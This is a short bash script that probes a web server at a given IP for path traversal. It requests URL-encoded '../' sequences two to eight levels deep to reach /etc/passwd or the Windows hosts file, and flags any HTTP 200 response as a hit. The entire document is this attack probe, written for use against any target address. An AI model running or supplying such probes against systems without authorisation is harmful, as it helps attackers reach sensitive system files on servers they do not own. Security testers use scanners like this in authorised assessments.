#!/bin/bash

# Check if correct number of arguments is provided
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <IP> <l|w>"
  exit 1
fi

# Assign arguments to variables
IP=$1
OS=$2

# Define the path to check based on the OS
if [ "$OS" == "l" ]; then
  FILE="etc/passwd"
elif [ "$OS" == "w" ]; then
  FILE="C:/Windows/System32/drivers/etc/hosts"
else
  echo "Invalid OS option. Use 'l' for Linux or 'w' for Windows."
  exit 1
fi

# Loop to check path traversal from 2 to 8 levels
for i in {2..8}; do
  TRAVERSAL=""
  for j in $(seq 1 $i); do
    TRAVERSAL="%2E%2E%2F$TRAVERSAL"
  done

  URL="http://$IP/$TRAVERSAL$FILE"
  echo "Checking: $URL"

  # Use curl to check the URL
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$URL")

  if [ "$RESPONSE" == "200" ]; then
    echo "Possible path traversal detected at: $URL"
  else
    echo "No access at: $URL (HTTP Status: $RESPONSE)"
  fi
done
